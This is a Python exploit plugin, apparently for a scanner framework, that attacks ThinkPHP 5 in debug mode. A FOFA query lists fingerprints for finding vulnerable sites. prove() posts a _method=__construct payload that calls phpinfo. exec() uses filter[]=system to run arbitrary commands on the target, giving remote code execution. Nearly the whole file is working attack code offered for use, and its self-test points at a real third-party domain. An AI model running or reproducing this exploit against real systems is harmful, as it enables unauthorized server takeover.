#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'
from urllib import parse

'''
open debug mode

fofa :
 "( app=\"ThinkSNS\")||( app=\"eyoucms\")||( app=\"Onethink\")||( app=\"TPshop\")||( body=\"/admin/login/checkverify.html?tm=\" || body=\"snake后台登录\")||( title=\"基于ThinkPHP5和Bootstrap的极速后台开发框架\" || title=\"fastadmin\" || body=\"fastadmin.net\")||( body=\"class=\\\"verifyimg reload-verify\\\"\" && body=\"class=\\\"panel-lite\\\"\" && body=\"lyui\")||( body=\"/public/static/admin/css/dolphin.css\" || body=\"/admin.php/user/publics/signin.html\" || body=\"/public/static/admin/js/dolphin.js\")||( body=\"/public/static/dist/img/logo.png\" || body=\"/Public/Admin/dist/img/logo.png\" || body=\"Powered by WeMall\")||( app=\"layui\")||( body=\"/css/AdminLTE.css\" || body=\"/css/AdminLTE.min.css\")||( body=\"yuan1994\" && body=\"/static/admin/h-ui/css/H-ui.min.css\"&& body=\"href=\\\"/static/admin/h-ui.admin/css/H-ui.login.css\\\"\")||( body=\"/admin/publics/index.html\" && body=\"login-head\")||( body=\"/haoidcn/Admin/Public\")||( body=\"/css/H-ui.min.css\" || body=\"/css/H-ui.login.css\" || body=\"/h-ui.admin/\")||( title=\"Tplay\" || ( body=\"Tplay\" && body=\"layui\"))||( body=\"/public/static/js/qibo.js\" || body=\"qb_ui.css\")||( body=\"/public/static/css/pc_reset.css\" || body=\"/public/static/css/qb_ui.css\")||( body=\"/css/AdminLTE.css\" || body=\"/css/AdminLTE.min.css\")||( body=\"YFCMF\" && body=\"/public/others/maxlength.js\" || body=\"/yfcmf/yfcmf.js\")||( body=\"/home/memberorder/index.html\" || body=\"/home/showjoinin/index.html\")||( body=\"http://www.cltphp.com/\" || body=\"this.src='/user/login/verify.html?'+'id='+Math.random()\")||\"ThinkPHP5\"|| app=\"ThinkPHP\""
'''
def info(data):
    info = {
        "name": "thinkphp 5 debug getshell",
        "info": "thinkphp 5 debug getshell",
        "level": "high",
        "type": "sql",
    }
    return info

def prove(data):
    init(data,'thinkphp')
    if data['base_url']:
        # headers['Content-Type'] = 'application/x-www-form-urlencoded'
        pocpath = 'index.php?s=captcha'
        poc = '_method=__construct&method=get&filter[]=phpinfo&server[REQUEST_METHOD]=1'
        for path in ['public/']:
            url = data['base_url'] + path + pocpath
            res = curl('post', url, data=poc)
            if res != None and 'PHP Version' in res.text:
                data['flag'] = 1
                data['data'].append({"flag": url})
                data['res'].append({"info": url, "key": "thinkphp 5 debug getshell"})
                break
    return data

def exec(data):
    init(data,'web')
    if data['base_url']:
        pocpath = 'index.php?s=captcha'
        poc = '_method=__construct&method=get&filter[]=system&server[REQUEST_METHOD]='+data['cmd']
        for path in ['','public/']:
            url = data['base_url'] + path + pocpath
            res = curl('get', url, data = poc)
            if res != None and res.status_code == 200:
                data['flag'] = 1
                data['data'].append({"flag": url})
                data['res'].append({"info": res.text, "key": "thinkphp 5 debug getshell"})
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))